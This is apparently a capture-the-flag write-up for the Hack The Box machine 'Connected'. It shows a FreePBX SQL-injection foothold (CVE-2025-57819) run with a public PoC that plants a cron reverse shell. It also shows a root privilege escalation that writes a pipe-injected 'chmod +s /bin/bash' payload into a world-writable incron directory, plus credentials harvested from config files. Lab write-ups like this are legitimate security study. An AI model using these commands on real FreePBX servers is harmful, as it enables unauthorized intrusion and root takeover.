# HTB — Connected (Easy, Linux/CentOS)

- Target: `10.129.46.160` — `connected.htb`
- Attacker: `10.10.16.141`
- Status: **ROOTED**
- user.txt: `65d9adc9088220ab07476c2baf10a5d9`
- root.txt: `a50db0b736fc6c19a3cbf8aea3f0f9b3`

## Enumeration

### nmap
```
22/tcp  OpenSSH 7.4 (protocol 2.0)
80/tcp  Apache 2.4.6 (CentOS) PHP/7.4.16  -> redirects to http://connected.htb/ -> /admin -> config.php
443/tcp ssl/http Apache 2.4.6  (cert CN = pbxconnect)
```

### App fingerprint
- `/` -> `/admin` -> `config.php` = **FreePBX Administration**, framework **`16.0.40.7`**
  (from `?load_version=16.0.40.7` on all assets, `<title>FreePBX Administration</title>`).

## Foothold — CVE-2025-57819 (FreePBX endpoint unauth SQLi -> RCE)
- FreePBX 15/16/17 `endpoint` module: insufficient sanitization -> unauth error-based SQLi (EXTRACTVALUE)
  with stacked writes via `POST /admin/ajax.php`, `module=FreePBX\modules\endpoint\ajax`, injectable `brand`.
  Fixed at endpoint 16.0.89 (16.x). CVSS 10.0, CISA KEV.
- PoC `b4sh2/CVE-2025-57819-poc` (cron_jobs revshell, one-shot, auto-cleanup):
  ```
  git clone https://github.com/b4sh2/CVE-2025-57819-poc && cd CVE-2025-57819-poc
  python3 exploit.py http://connected.htb --ip 10.10.16.141 -p 4444
  ```
  -> confirms SQLi (DB `5.5.65-MariaDB`), inserts a `* * * * *` cron row = bash reverse shell that
  FreePBX's cron manager runs as **`asterisk`** within ~60s, then removes the row.
- Shell as `asterisk`. **user.txt** in `/home/asterisk/user.txt`.
- Stable access: dropped SSH key into `~/.ssh/authorized_keys` (transfer via `curl http://<kali>:8000/k.pub`
  — the PoC's PTY mangles long pastes; use short curl/base64 to avoid line-wrapping corruption).

### Creds harvested (asterisk)
- `/etc/freepbx.conf`: DB `freepbxuser:mZzDpAGKTmPJ` (db `asterisk`, localhost).
- `/etc/amportal.conf`: AMPMGRPASS, `PHP_CONSOLE_PASSWORD=batteryhorsestaple` (none reused for root — not needed).

## Privesc — FreePBX sysadmin incron hook (asterisk -> root)

### Red herring
- Root-owned `aiovega` app on `127.0.0.1:4000` (aiohttp Vega gateway bridge, contact "Simon Gomizelj").
  Spent time reading it — all handlers only drive a *remote* Vega via the `X-Vega-Connection` URL; no
  local file/command primitive. **It's a decoy.** MongoDB/Redis on localhost are also decoys.
- Lesson: on an *easy* box, check public/known privesc paths early; don't over-invest reversing a
  custom service before confirming it even has a local sink. [[feedback-methodology]]

### The real path
- `root` runs `/usr/sbin/incrond`. Table (`/etc/incron.d/sysadmin`) watches, among others:
  ```
  /usr/local/asterisk/incron   IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#
  /var/spool/asterisk/incron   IN_MODIFY,...   /usr/bin/sysadmin_manager $#
  ```
- `/usr/local/asterisk/incron/` is **world-writable** (`drwxrwxrwx`). Dropping a file there makes root
  run `sysadmin_manager --local <filename>`.
- `/usr/bin/sysadmin_manager` (PHP, un-encoded on purpose) logic:
  1. filename parsed as `module.hook.params` (regex `^([\w_]+)\.([\w-]+)(?:\.(.+))?$`).
  2. requires a GPG-signed `module.sig` (FreePBX whitelist key) whose signed hashes include an
     **executable** `hooks/<hook>` — **can't forge, but every stock installed module already passes**.
  3. sanitizes `params`: rejects non-printable and `` `'"$><&; `` — **but NOT the pipe `|`**.
  4. `system("$hookfile $params")` **as root**.
- Two enabling tricks:
  - Filenames can't hold `/`, so use the magic **`CONTENTS`** param: name file `module.hook.CONTENTS`
    and put the real params (may contain `/`) *inside* the file (read via `fread`, up to 4k).
  - `|` survives the filter -> `params = |chmod +s /bin/bash` makes root run `hook |chmod +s /bin/bash`.

### Exploit (2 commands)
Pick any signed stock module + executable hook (used `core` / `logrotate`):
```
printf '|chmod +s /bin/bash' > /usr/local/asterisk/incron/core.logrotate.CONTENTS   # root runs chmod +s /bin/bash
# wait ~5s
/bin/bash -p                                                                          # euid=0
cat /root/root.txt
```
`ls -l /bin/bash` -> `-rwsr-sr-x`. `/bin/bash -p` -> `euid=0(root)`. **root.txt** captured.

## Key lessons
- FreePBX 16.0.40.7 = CVE-2025-57819 (endpoint unauth SQLi->RCE) foothold; cron_jobs revshell runs as `asterisk`.
- FreePBX `sysadmin` module ships a root incron hook runner (`sysadmin_manager`) whose param filter misses
  `|`; combined with a world-writable watched dir + the `CONTENTS` magic param = trivial root. Reusable.
- Ignore the shiny custom root service (`aiovega`) — verify a local sink exists before reversing it.
